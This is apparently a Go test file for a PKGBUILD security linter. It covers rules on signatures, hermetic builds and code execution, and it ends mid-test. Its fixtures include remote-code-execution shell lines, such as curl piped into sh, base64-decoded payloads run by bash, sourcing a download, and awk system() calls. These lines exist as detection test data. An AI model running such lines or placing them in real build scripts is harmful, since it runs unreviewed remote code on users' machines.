	})
	t.Run("PB101 not for the signature file or its signed artifact", func(t *testing.T) {
		expectNoRule(t, "PB101", map[string]string{"PKGBUILD": pkgbuildWith(sigWithKeys, "")})
	})
	t.Run("PB112 signature over http", func(t *testing.T) {
		files := map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo-1.tar.gz"
        "http://example.com/demo-1.tar.gz.sig")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef' 'SKIP')
validpgpkeys=('ABAF11C65A2970B130ABE3C479BE3E4300411886')`, "")}
		expectRule(t, "PB112", files)
		expectNoRule(t, "PB104", files) // PB112 owns signature transport
	})
	t.Run("PB112 not for https signature", func(t *testing.T) {
		expectNoRule(t, "PB112", map[string]string{"PKGBUILD": pkgbuildWith(sigWithKeys, "")})
	})
	t.Run("PB113 keys pinned but nothing signed", func(t *testing.T) {
		expectRule(t, "PB113", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo-1.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')
validpgpkeys=('ABAF11C65A2970B130ABE3C479BE3E4300411886')`, "")})
	})
	t.Run("PB113 not when a signature source exists", func(t *testing.T) {
		expectNoRule(t, "PB113", map[string]string{"PKGBUILD": pkgbuildWith(sigWithKeys, "")})
	})
	t.Run("PB113 not for a brace-expanded signature pair", func(t *testing.T) {
		files := map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo-1.tar.gz{,.sig}")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef' 'SKIP')
validpgpkeys=('ABAF11C65A2970B130ABE3C479BE3E4300411886')`, "")}
		expectNoRule(t, "PB113", files)
		expectNoRule(t, "PB110", files) // two sums pair with the two expanded sources
	})
	t.Run("PB113 not when a signed VCS source exists", func(t *testing.T) {
		expectNoRule(t, "PB113", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git?signed#tag=v1")
sha256sums=('SKIP')
validpgpkeys=('ABAF11C65A2970B130ABE3C479BE3E4300411886')`, "")})
	})
}

func TestHermeticRules(t *testing.T) {
	t.Run("PB201 curl in build", func(t *testing.T) {
		expectRule(t, "PB201", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  curl -O https://example.com/extra.tar.gz
}`)})
	})
	t.Run("PB201 curl in prepare is fine", func(t *testing.T) {
		expectNoRule(t, "PB201", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  curl -O https://example.com/extra.tar.gz
}`)})
	})
	t.Run("PB202 pip without hashes", func(t *testing.T) {
		expectRule(t, "PB202", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  pip install -r requirements.txt
}`)})
	})
	t.Run("PB202 pip with hashes ok", func(t *testing.T) {
		expectNoRule(t, "PB202", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  pip install --require-hashes -r requirements.txt
}`)})
	})
	t.Run("PB203 cargo build unlocked", func(t *testing.T) {
		expectRule(t, "PB203", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  cargo build --release
}`)})
	})
	t.Run("PB203 cargo --locked ok", func(t *testing.T) {
		expectNoRule(t, "PB203", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  cargo build --release --locked
}`)})
	})
	t.Run("PB203 --locked inside a variable counts", func(t *testing.T) {
		expectNoRule(t, "PB203", map[string]string{"PKGBUILD": pkgbuildWith("", `
_cargo_flags="--release --locked"
build() {
  cargo build $_cargo_flags
}`)})
	})
	t.Run("PB203 --frozen inside an array counts", func(t *testing.T) {
		// The lib32-rav1e shape: one array of options per phase, expanded into
		// every cargo command the phase runs.
		expectNoRule(t, "PB203", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  _flags=(--release --frozen)
  cargo build "${_flags[@]}"
}`)})
	})
	t.Run("PB203 a variable holding no lockfile flag still reports", func(t *testing.T) {
		// Reading the variable has to work in both directions, or the rule
		// would stand down for every command that expands one.
		expectRule(t, "PB203", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  _cargoflags="-Zbuild-std=std,panic_abort"
  cargo build --release $_cargoflags
}`)})
	})
	t.Run("PB203 flags pkglint cannot read stand down", func(t *testing.T) {
		// Nothing in the file assigns it, so --locked may well be in there.
		expectNoRule(t, "PB203", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  cargo build $CARGO_ARGS
}`)})
	})
	t.Run("PB203 an unreadable target is a value, not a flag", func(t *testing.T) {
		// The guidelines' own prepare(): the target triple is computed, but
		// nothing about it could be the missing lockfile flag.
		expectRule(t, "PB203", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  cargo fetch --target "$CARCH-unknown-linux-gnu"
}`)})
	})
	t.Run("PB204 bare go build", func(t *testing.T) {
		expectRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  go build -o demo .
}`)})
	})
	t.Run("PB204 vendored go build ok", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  go build -mod=vendor -o demo .
}`)})
	})
	t.Run("PB204 -mod=vendor in a GOFLAGS exported inside build() ok", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  export GOFLAGS="-buildmode=pie -mod=vendor -modcacherw"
  go build -o demo .
}`)})
	})
	t.Run("PB204 GOPATH mode with modules off reads the assembled tree, not the network", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  mkdir -p build/src
  mv demo-$pkgver/vendor/* build/src/
}
build() {
  export GOPATH="$srcdir/build"
  export GO111MODULE=off
  go build -o bin/demo cmd/demo/main.go
}`)})
	})
	t.Run("PB204 GOFLAGS vendor mode only covers commands it reaches", func(t *testing.T) {
		expectRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  go build -o demo .
  export GOFLAGS="-mod=vendor"
}`)})
	})
	t.Run("PB204 go mod download in prepare ok", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  go mod download
}
build() {
  go build -o demo .
}`)})
	})
	t.Run("PB205 GOFLAGS -insecure", func(t *testing.T) {
		expectRule(t, "PB205", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  GOFLAGS=-insecure go build -o demo .
}`)})
	})
	t.Run("PB206 npm install", func(t *testing.T) {
		expectRule(t, "PB206", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  npm install
}`)})
	})
	t.Run("PB206 pnpm install unlocked", func(t *testing.T) {
		expectRule(t, "PB206", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  pnpm install
}`)})
	})
	t.Run("PB206 pnpm frozen lockfile ok", func(t *testing.T) {
		expectNoRule(t, "PB206", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  pnpm install --frozen-lockfile
}`)})
	})
	t.Run("PB206 bun install unlocked", func(t *testing.T) {
		expectRule(t, "PB206", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  bun install
}`)})
	})
	t.Run("PB202 uv pip install without hashes", func(t *testing.T) {
		expectRule(t, "PB202", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  uv pip install -r requirements.txt
}`)})
	})
	t.Run("PB202 uv pip install with hashes ok", func(t *testing.T) {
		expectNoRule(t, "PB202", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  uv pip install --require-hashes -r requirements.txt
}`)})
	})
	t.Run("PB204 go install mutable @latest even in prepare", func(t *testing.T) {
		expectRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  go install github.com/example/tool@latest
}`)})
	})
	t.Run("PB204 pinned @version in prepare is fine", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  go install github.com/example/tool@v1.2.3
}`)})
	})
	t.Run("PB207 composer install without --no-scripts", func(t *testing.T) {
		expectRule(t, "PB207", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  composer install
}`)})
	})
	t.Run("PB207 composer install --no-scripts ok", func(t *testing.T) {
		expectNoRule(t, "PB207", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  composer install --no-scripts
}`)})
	})
	t.Run("PB207 composer update re-resolves", func(t *testing.T) {
		expectRule(t, "PB207", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  composer update --no-scripts
}`)})
	})
	t.Run("PB208 bundle install unlocked", func(t *testing.T) {
		expectRule(t, "PB208", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  bundle install
}`)})
	})
	t.Run("PB208 bundle install --frozen ok", func(t *testing.T) {
		expectNoRule(t, "PB208", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  bundle install --frozen
}`)})
	})
	t.Run("PB208 gem install is PB210's, not bundler's", func(t *testing.T) {
		expectNoRule(t, "PB208", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  gem install rails
}`)})
	})
	t.Run("PB209 uv sync unlocked", func(t *testing.T) {
		expectRule(t, "PB209", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  uv sync
}`)})
	})
	t.Run("PB209 uv sync --frozen ok", func(t *testing.T) {
		expectNoRule(t, "PB209", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  uv sync --frozen
}`)})
	})
	t.Run("PB209 poetry update re-resolves", func(t *testing.T) {
		expectRule(t, "PB209", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  poetry update
}`)})
	})
	t.Run("PB209 poetry add is PB210's", func(t *testing.T) {
		expectNoRule(t, "PB209", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  poetry add requests
}`)})
	})
	t.Run("PB209 poetry install against lock is fine", func(t *testing.T) {
		expectNoRule(t, "PB209", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  poetry install
}`)})
	})
	t.Run("PB201 uv sync in build is a network download", func(t *testing.T) {
		expectRule(t, "PB201", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  uv sync --frozen
}`)})
	})
	t.Run("PB201 bundle install in build is a network download", func(t *testing.T) {
		expectRule(t, "PB201", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  bundle install --frozen
}`)})
	})
}

// headerWithSource builds a PKGBUILD header whose source array is exactly src.
func headerWithSource(src string) string {
	return `pkgname=demo
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url='https://example.com/demo'
license=('MIT')
source=(` + src + `)
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`
}

// TestHermeticityCoverageGaps covers three ways a PKGBUILD used to defeat the
// hermeticity rules: a build-phase `go get`, a source URL merely containing
// "vendor", and `export GOSUMDB=off` inside a build function.
func TestHermeticityCoverageGaps(t *testing.T) {
	// A — build-phase `go get` is an implicit download.
	t.Run("PB204 bare go get in build", func(t *testing.T) {
		expectRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  go get example.com/m
}`)})
	})
	t.Run("PB204 go get in prepare is fine", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  go get example.com/m
}`)})
	})
	t.Run("PB204 mutable go get in build reports exactly once", func(t *testing.T) {
		ids := ruleIDs(lint(t, map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  go get example.com/m@latest
}`)}))
		if ids["PB204"] != 1 {
			t.Errorf("expected exactly one PB204, got %v", ids)
		}
	})

	// B — a "vendor" substring in a source URL must not disable PB204.
	t.Run("PB204 vendor substring in source URL does not suppress", func(t *testing.T) {
		expectRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith(
			headerWithSource(`"https://github.com/somevendor/proj/archive/v1.tar.gz"`), `
build() {
  go build -o demo .
}`)})
	})
	t.Run("PB204 real vendor archive suppresses", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith(
			headerWithSource(`"vendor.tar.gz"`), `
build() {
  go build -o demo .
}`)})
	})
	t.Run("PB204 named vendor bundle suppresses", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith(
			headerWithSource(`"vendor::https://example.com/demo-deps.tar.gz"`), `
build() {
  go build -o demo .
}`)})
	})
	t.Run("PB204 suffixed vendor archive suppresses", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith(
			headerWithSource(`"https://example.com/demo-1.0-vendor.tar.zst"`), `
build() {
  go build -o demo .
}`)})
	})

	// C — export/declare inside a function is a DeclClause, not a Command.
	t.Run("PB205 export GOSUMDB=off inside build", func(t *testing.T) {
		expectRule(t, "PB205", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  export GOSUMDB=off
  go build -mod=vendor -o demo .
}`)})
	})
	t.Run("PB205 declare GOINSECURE inside build", func(t *testing.T) {
		expectRule(t, "PB205", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  declare GOINSECURE='*.example.com'
  go build -mod=vendor -o demo .
}`)})
	})
	t.Run("PB205 top-level export reports exactly once", func(t *testing.T) {
		ids := ruleIDs(lint(t, map[string]string{"PKGBUILD": pkgbuildWith("", `
export GOSUMDB=off

build() {
  go build -mod=vendor -o demo .
}`)}))
		if ids["PB205"] != 1 {
			t.Errorf("expected exactly one PB205, got %v", ids)
		}
	})
	t.Run("PB205 bare top-level assignment still fires", func(t *testing.T) {
		expectRule(t, "PB205", map[string]string{"PKGBUILD": pkgbuildWith("", `
GOSUMDB=off

build() {
  go build -mod=vendor -o demo .
}`)})
	})
	t.Run("PB205 benign export inside build is fine", func(t *testing.T) {
		expectNoRule(t, "PB205", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  export GOFLAGS=-trimpath
  go build -mod=vendor -o demo .
}`)})
	})
}

func TestExecRules(t *testing.T) {
	t.Run("PB301 top-level command", func(t *testing.T) {
		expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `curl https://example.com/beacon`)})
	})
	t.Run("PB301 top-level assignments fine", func(t *testing.T) {
		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": cleanPKGBUILD})
	})
	t.Run("PB301 function declared inside a top-level if is not top-level code", func(t *testing.T) {
		// The AUR idiom for a package that is both a -git and a release build:
		// pick between two pkgver() bodies with a top-level `if`. The bodies run
		// when makepkg calls the phase, not when the file is sourced.
		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
if [[ -n $_git ]]; then
  pkgver() {
    cd "$srcdir"
    git describe --tags
  }
else
  pkgver() {
    printf '%s' "$pkgver"
  }
fi`)})
	})
	t.Run("PB201 helper declared inside build() is still build's network access", func(t *testing.T) {
		// A function declared in another function only exists while it runs:
		// `_dl() { curl …; }` in build() is build() downloading however it is
		// spelled. Re-homing it (as the top-level `if` idiom does) would strip
		// it from every phase-keyed rule.
		expectRule(t, "PB201", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  _dl() {
    curl -O https://example.com/extra.tar.gz
  }
  _dl
}`)})
	})
	t.Run("PB301 nested function body still reaches function-scoped rules", func(t *testing.T) {
		// The flip side: once attributed to pkgver(), PB602 can see it. Before
		// the nested-FuncDecl fix this network call was invisible to every rule
		// that keys off the enclosing function.
		expectRule(t, "PB602", map[string]string{"PKGBUILD": pkgbuildWith("", `
if [[ -n $_git ]]; then
  pkgver() {
    curl -s https://example.com/version
  }
fi`)})
	})
	t.Run("PB301 inert top-level guards and banners are not flagged", func(t *testing.T) {
		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
if [ "$CARCH" = "i686" ]; then
  _lib=lib32
fi
test -n "$_lib"
echo "building $pkgname"
printf '%s\n' "$_lib"
warning "this package is deprecated"
msg2 "using $_lib"
cat /dev/null`)})
	})
	t.Run("PB301 reading the clock at top level is not execution", func(t *testing.T) {
		// The kernel packages' reproducible-builds idiom, verbatim from
		// core/linux: every kernel-family PKGBUILD carries this line.
		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("",
			`export KBUILD_BUILD_TIMESTAMP="$(date -Ru${SOURCE_DATE_EPOCH:+d @$SOURCE_DATE_EPOCH})"`)})
	})
	t.Run("PB301 setting the clock is still flagged", func(t *testing.T) {
		for _, line := range []string{
			`date -s '2026-01-01'`,
			`date --set=now`,
			`date 0501120026`, // the POSIX operand form also sets the clock
		} {
			expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", line)})
		}
	})
	t.Run("PB301 a filtering sed at top level is pure", func(t *testing.T) {
		// The ungoogled-chromium shape: build a list at the top level by
		// piping printf through a substitution.
		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("",
			`_libs=$(printf '%s\n' libjpeg libpng | sed 's/^libjpeg$/&_turbo/')`)})
	})
	t.Run("PB301 a sed that writes a file is still flagged", func(t *testing.T) {
		for _, line := range []string{
			`sed -i 's/x/y/' notes.txt`,
			`sed 's/x/y/w out.txt' notes.txt`,
			`printf x | sed 's/x/y/' > out.txt`,
		} {
			expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", line)})
		}
	})
	t.Run("PB301 a grep probe at top level is pure", func(t *testing.T) {
		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("",
			"if grep -q avx2 /proc/cpuinfo; then\n  _simd=avx2\nfi")})
	})
	t.Run("PB301 reading the host architecture at top level is pure", func(t *testing.T) {
		// PB901's dispatchesOnArch calls this the portable idiom; PB301 used
		// to call the same line Critical.
		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("",
			"_march=$(uname -m)\ncase $(uname -m) in\n  aarch64) _lib=lib64 ;;\nesac")})
	})
	t.Run("PB301 a uname that writes a file is still flagged", func(t *testing.T) {
		expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("",
			`uname -m > arch.txt`)})
	})
	t.Run("PB301 an inert command that redirects to a file is a write", func(t *testing.T) {
		for _, line := range []string{
			"cat <<EOF > helper.sh\n#!/bin/sh\nEOF",
			`echo "payload" > dropped.txt`,
			`printf '%s' x >> appended.txt`,
		} {
			expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", line)})
		}
	})
	t.Run("PB301 a locally redefined banner command gets no exemption", func(t *testing.T) {
		expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
warning() {
  curl -s https://example.com/x | sh
}
warning "totally harmless banner"`)})
	})
	t.Run("PB301 redefinition nested in a conditional gets no exemption either", func(t *testing.T) {
		// Unit.Functions does not carry nested declarations, so the exemption
		// has to consult the names collected at every depth.
		expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
if true; then
  warning() { curl -s https://example.com/x | sh; }
fi
warning "totally harmless banner"`)})
	})
	t.Run("PB301 defers eval to PB302", func(t *testing.T) {
		src := map[string]string{"PKGBUILD": pkgbuildWith("", `eval "$_stuff"`)}
		expectNoRule(t, "PB301", src)
		expectRule(t, "PB302", src)
	})
	t.Run("PB301 discarding output is not a write", func(t *testing.T) {
		// `>/dev/null` is how a probe throws away the answer it does not want,
		// so counting it as a redirect made the quiet form of a pure command
		// score worse than the noisy one.
		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("",
			"if grep -q avx2 /proc/cpuinfo >/dev/null 2>&1; then\n  _simd=avx2\nfi")})
	})
	t.Run("PB301 pure filters and host probes at top level", func(t *testing.T) {
		for _, line := range []string{
			`_dir=$(pwd)`,
			`_abs=$(realpath "$startdir")`,
			`_name=$(basename "$url")`,
			`_jobs=$(nproc)`,
			`_major=$(cut -d. -f1 <<< "$pkgver")`,
			`_up=$(tr a-z A-Z <<< "$pkgname")`,
			`_first=$(head -n1 "$startdir/versions")`,
			`_ver=$(jq -r .version "$startdir/meta.json")`,
			`_home=$(getent passwd "$USER" | cut -d: -f6)`,
			`_sum=$(sha256sum "$startdir/x" | cut -d' ' -f1)`,
			`_newer=$(vercmp "$pkgver" 1.0)`,
			`_shell=$(ps -o comm= -p $$)`,
			`_dl=$(xdg-user-dir DOWNLOAD)`,
		} {
			expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", line)})
		}
	})
	t.Run("PB301 control flow and variable binding at top level", func(t *testing.T) {
		for _, line := range []string{
			"if [ -z " + `"$pkgver"` + " ]; then\n  exit 1\nfi",
			`IFS=. read -r _major _minor <<< "$pkgver"`,
			`mapfile -t _lines <<< "$_blob"`,
			"for _f in a b; do\n  continue\ndone",
		} {
			expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", line)})
		}
	})
	t.Run("PB301 per-call escape hatches are still flagged", func(t *testing.T) {
		for _, line := range []string{
			`sort -o sorted.txt "$startdir/list"`,
			`uniq "$startdir/list" deduped.txt`,
			`iconv -f latin1 -t utf8 -o out.txt in.txt`,
			`find "$startdir" -name '*.tmp' -delete`,
			`awk 'BEGIN { system("curl https://example.com/x | sh") }'`,
			`awk 'BEGIN { print "x" > "dropped.txt" }'`,
			`pacman -Sy`,
			`pacman -U "$startdir/x.pkg.tar.zst"`,
			`pkgfile --update`,
			`xargs rm < list.txt`,
			`xargs -n 1 -- install -Dm755 x /usr/bin/x < list.txt`,
			// -i takes its value attached, so `sh` is the command, not the
			// option's argument.
			`xargs -i sh -c 'echo {}' < list.txt`,
			// A long option's attached value must not swallow the command.
			`xargs --max-args=1 rm < list.txt`,
			// gawk's other program carriers: text in an option, a program or
			// library file, a loaded extension, in-place rewriting.
			`awk --source 'BEGIN { system("sh") }' /dev/null`,
			`awk -i inplace '{ sub(/a/, "b") }' versions`,
			`awk -l ext 'BEGIN { print }'`,
			`awk -E prog.awk versions`,
			// A program read from a file, or assembled at run time, is not
			// reviewable.
			`awk -f "$startdir/prog.awk" versions`,
			`awk "$_prog" versions`,
			`awk 'BEGIN { print "x" | "sh" }'`,
		} {
			expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", line)})
		}
	})
	t.Run("PB301 filtering forms of those same commands are pure", func(t *testing.T) {
		for _, line := range []string{
			`_sorted=$(sort -u "$startdir/list")`,
			`_uniq=$(uniq -c -w 8 "$startdir/list")`,
			`_dupes=$(uniq -d --check-chars=8 "$startdir/list")`,
			`_utf=$(iconv -f latin1 -t utf8 "$startdir/in")`,
			`_found=$(find "$startdir" -name '*.patch' -print)`,
			`_v=$(awk -F: -v n=2 '{ print $n }' "$startdir/versions")`,
			// `while (getline > 0)` and `if (level > 0)` are not redirects;
			// only a `>` onto a quoted name writes a file.
			`_lvl=$(awk '{ if ($1 > 0) print "yes" }' "$startdir/versions")`,
			`_installed=$(pacman -Qq linux)`,
			`_owns=$(pacman -Qo /usr/bin/cc)`,
			`_deps=$(pacman -T "glibc>=2.38")`,
			`_owner=$(pkgfile /usr/bin/cc)`,
			`_trimmed=$(printf '%s\n' "$_blob" | xargs)`,
			`_pairs=$(printf '%s\n' "${_libs[@]}" | xargs -I@ printf '%s::%s ' @ "$url/@")`,
		} {
			expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", line)})
		}
	})
	t.Run("PB301 a command -v probe is a lookup, not an invocation", func(t *testing.T) {
		// Resolving the wrapper through to its argument read `command -v m4` as
		// m4 running at top level, and a `command -v yarn` in build() as yarn
		// reaching the network for PB201.
		src := map[string]string{"PKGBUILD": pkgbuildWith("", `_m4=$(command -v m4)
if command -v ccache >/dev/null; then
  _ccache=1
fi`)}
		expectNoRule(t, "PB301", src)
		expectNoRule(t, "PB201", src)
	})
	t.Run("PB301 a helper that only reads and tests is not execution", func(t *testing.T) {
		// The archetype: PKGBUILDs factor top-level dispatch into a named
		// helper, and judging the call by its name alone made the tidier
		// spelling of a top-level `case` the more severely graded one.
		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
format_version() {
  local _v="$1"
  printf '%s' "${_v//_/.}"
}
_is_lto_kernel() {
  [[ -n "$_lto" ]] && return 0
  return 1
}
_arch_map() {
  case "$CARCH" in
    x86_64) echo amd64 ;;
    *) echo "$CARCH" ;;
  esac
}
_pretty=$(format_version "$pkgver")
_flavour=$(_arch_map)
if _is_lto_kernel; then
  _opts=lto
fi`)})
	})
	t.Run("PB301 a helper is judged through every hop it makes", func(t *testing.T) {
		for _, body := range []string{
			// The work is one call away.
			"_outer() { _inner; }\n_inner() { curl -fsSL https://example.com/x; }\n_outer",
			// And two, through a helper that otherwise looks pure.
			"_a() { echo \"$(_b)\"; }\n_b() { _c; }\n_c() { wget -qO- https://example.com/x; }\n_a",
			// A name assembled at run time is not reviewable.
			"_run() { $_cmd --version; }\n_run",
			// The redirect hangs off the group, not off any one command.
			"_drop() { { echo '#!/bin/sh'; echo payload; } > helper.sh; }\n_drop",
			// A helper that writes.
			"_gen() { printf '%s' x > dropped.txt; }\n_gen",
		} {
			expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", body)})
		}
	})
	t.Run("PB301 mutually recursive pure helpers converge", func(t *testing.T) {
		// A depth-first walk needs cycle detection to answer this; the greatest
		// fixpoint assumes both pure and finds nothing to retract.
		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
_even() { [[ $1 -eq 0 ]] && return 0; _odd $(($1 - 1)); }
_odd() { [[ $1 -eq 0 ]] && return 1; _even $(($1 - 1)); }
_even 4 && _parity=even`)})
	})
	t.Run("PB301 a mutually recursive pair that reaches the network is flagged", func(t *testing.T) {
		expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
_ping() { _pong; }
_pong() { curl -fsSL https://example.com/x || _ping; }
_ping`)})
	})
	t.Run("PB302 eval", func(t *testing.T) {
		expectRule(t, "PB302", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  eval "$stuff"
}`)})
	})
	t.Run("PB302 constant metadata assignment is inert", func(t *testing.T) {
		// retroshare's idiom: a conditional depends+= kept out of .SRCINFO.
		// The string is constant and assigns literals, so review sees
		// exactly what runs.
		for _, line := range []string{
			`eval "depends+=(
      'libbz2.so'    # bzip2
      'libssl.so'    # openssl
    )"`,
			`eval 'optdepends_x86_64=("foo: bar")'`,
			`eval "provides=(libfoo.so) conflicts=(foo-git)"`,
			`eval "depends=(a" ")"`,              // eval joins its words with spaces
			`eval 'depends=("lib*.so" "{a,b}")'`, // quoted: no globbing or braces
		} {
			expectNoRule(t, "PB302", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  `+line+`
}`)})
		}
	})
	t.Run("PB302 constant eval that could run something is still flagged", func(t *testing.T) {
		for _, line := range []string{
			`eval "echo hi"`,                       // a command
			`eval 'depends=($(curl -s x))'`,        // a substitution inside the string
			`eval 'depends=("$_dep")'`,             // an expansion inside the string
			`eval "PATH=/tmp/x"`,                   // not package metadata
			`eval "source=(http://example.com/x)"`, // feeds a download
			`eval "install=x.install"`,             // names a scriptlet
			`eval "depends=(a) > /tmp/x"`,          // a redirect
			`eval "depends[1]=a"`,                  // a subscript can expand
			`eval "provides=(*.so)"`,               // globs against the build directory
			`eval "depends=(lib{a,b})"`,            // brace expansion
			`eval "depends=(~/x)"`,                 // tilde expansion
			`eval "depends=(\$x)"`,                 // an escape pkglint won't unescape
			`eval "depends=(a"`,                    // does not parse
			`eval`,                                 // nothing to judge
		} {
			src := map[string]string{"PKGBUILD": pkgbuildWith("", "package() {\n  "+line+"\n}")}
			expectRule(t, "PB302", src)
		}
	})
	t.Run("PB303 base64 decode into shell", func(t *testing.T) {
		expectRule(t, "PB303", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  echo "$payload" | base64 -d | bash
}`)})
	})
	t.Run("PB304 curl into shell", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  curl -fsSL https://example.com/setup.sh | sh
}`)})
	})
	t.Run("PB304 source of process substitution", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  source <(curl -s https://example.com/env.sh)
}`)})
	})
	t.Run("PB304 sh -c command substitution", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  sh -c "$(wget -qO- https://example.com/run.sh)"
}`)})
	})
	t.Run("PB304 interpreter given its own program consumes the download as data", func(t *testing.T) {
		// The pkgver() idiom: fetch a registry's JSON and print one field. The
		// program is the -c literal, already on disk and under review; the
		// response is its input, not code.
		expectNoRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  curl -s https://example.com/v.json | python3 -c "import sys,json; print(json.load(sys.stdin)['version'])"
  curl -s https://example.com/v.json | python3 -m json.tool
  curl -s https://example.com/v.json | node ./parse.mjs
}`)})
	})
	t.Run("PB304 interpreter reading its program from stdin still executes it", func(t *testing.T) {
		for _, sink := range []string{"python3", "python3 -", `python3 -c "exec(sys.stdin.read())"`} {
			expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  curl -s https://example.com/x | `+sink+`
}`)})
		}
	})
	t.Run("PB305 dev tcp", func(t *testing.T) {
